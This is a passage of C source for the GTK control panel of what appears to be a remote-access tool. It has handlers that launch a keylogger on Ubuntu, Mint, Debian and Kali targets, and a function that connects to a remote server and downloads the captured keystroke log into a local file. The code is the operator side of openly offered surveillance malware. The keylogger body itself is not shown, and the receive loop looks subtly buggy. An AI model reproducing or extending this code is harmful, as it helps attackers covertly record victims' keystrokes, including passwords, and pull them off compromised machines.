    if(fputs(buffer_cmd, log_cmd_results) == EOF)
    {
        error("fputs() buffer_cmd", "send_cmd()");
        exit(-1);
    }

    if(fputs("\n", log_cmd_results) == EOF)
    {
        error("fputs() \n", "send_cmd()");
        exit(-1);
    }

    if(fputs(buffer, log_cmd_results) == EOF)
    {
        error("fputs() buffer", "send_cmd()");
        exit(-1);
    }

    if(fputs("\n\n", log_cmd_results) == EOF)
    {
        error("fputs() :\\n x 2", "send_cmd");
        exit(-1);
    }

    free(buffer);

    fclose(log_cmd_results);

    return;
}


void ubuntu_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Keylogger ?");

    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            ubuntu_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;

        default :
            break;
    }

    return;
}


void mint_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Keylogger ?");

    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            mint_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;

        default :
            break;
    }

    return;
}

void debian_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Keylogger ?");

    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            debian_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;

        default :
            break;
    }

    return;
}

void kali_run_the_keylogger(GtkButton *button, gpointer user_data)
{
    GtkWidget *launch_keylogger_dialog = NULL;

    launch_keylogger_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_QUESTION, GTK_BUTTONS_YES_NO, "Launch the Keylogger ?");

    switch(gtk_dialog_run(GTK_DIALOG(launch_keylogger_dialog)))
    {
        case GTK_RESPONSE_YES:
            gtk_widget_destroy(launch_keylogger_dialog);
            kali_init_keylogger();
            break;

        case GTK_RESPONSE_NO:
            gtk_widget_destroy(launch_keylogger_dialog);
            break;

        default :
            break;
    }

    return;
}

void open_log_file(GtkButton *button, gpointer user_data)
{
    SOCKET sock;
    SOCKADDR_IN sin;

    struct hostent *he = NULL;
    struct in_addr ipv4addr;

    char buffer[MAXDATASIZE] = "";

    long tailleBlockRecut = 0;
    long data_len = 0;
    long totalRcv = 0;

    FILE *log_file = NULL;
    size_t flag_log = 11;

    GtkTextBuffer *text_buffer = NULL;
    gchar *text = NULL;
    GtkTextIter start;
    GtkTextIter end;

    log_file = fopen("keylogger.log", "w+");
    if(log_file == NULL)
    {
        perror("fopen() : ");
        exit(errno);
    }

    port = atoi(server_port);

    inet_pton(AF_INET, server_ip, &ipv4addr);
    he = gethostbyaddr(&ipv4addr, sizeof ipv4addr, AF_INET);

    sin.sin_addr = *((struct in_addr *)he->h_addr);
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET)
    {
        error("socket()", "ubuntu_record()");
        exit(-1);
    }

    /** Si le client arrive à se connecter */
    if(connect(sock, (SOCKADDR*)&sin, sizeof(sin)) == SOCKET_ERROR)
    {
        error("connect()", "open_log_file()");
        exit(-1);

    }

    if(send(sock, (char*)&flag_log, sizeof(flag_log), 0) == SOCKET_ERROR)
    {
        error("send() flag_log", "open_log_file()");
        exit(-1);
    }

    if(recv(sock, (char*)&data_len, sizeof(data_len), 0) == SOCKET_ERROR)
    {
        error("recv() data_len", "open_log_file()");
        exit(-1);
    }

    do
    {
        tailleBlockRecut = recv(sock, buffer, sizeof(data_len), 0);
        if(tailleBlockRecut < 0)
        {
            error("recv() buffer", "open_log_file()");
            exit(-1);
        }

        fwrite(buffer, sizeof(char), tailleBlockRecut, log_file);

        totalRcv += tailleBlockRecut;

        //fputs(buffer, log_file);

    }while(totalRcv < data_len);

    /* Obtaining the buffer associated with the widget. */
    text_buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(text_view));

    /* Set the default buffer text. */
    gtk_text_buffer_set_text(text_buffer, "Log File Received ...", -1);

    /* Obtain iters for the start and end of points of the buffer */
    gtk_text_buffer_get_start_iter(text_buffer, &start);
    gtk_text_buffer_get_end_iter(text_buffer, &end);

    /* Get the entire buffer text. */
    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);

    /* Print the text */
    g_print("%s", text);

    g_free(text);

    fclose(log_file);

    close(sock);
}

/* Windows Skins CallBacks */

/* Set skins 1 */
void cb_set_skin_1(GtkButton *button, gpointer user_data)
{
    set_skin_number_one(user_data);
}

/* Set skins 2 */
void cb_set_skin_2(GtkButton *button, gpointer user_data)
{
    set_skin_number_two(user_data);
}

/* Set skins 3 */
void cb_set_skin_3(GtkButton *button, gpointer user_data)
{
    set_skin_number_three(user_data);
}

